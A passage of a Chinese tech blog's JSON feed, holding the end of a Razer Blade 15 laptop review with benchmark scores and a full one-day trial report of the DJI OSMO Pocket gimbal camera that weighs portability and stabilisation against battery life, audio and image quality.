https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]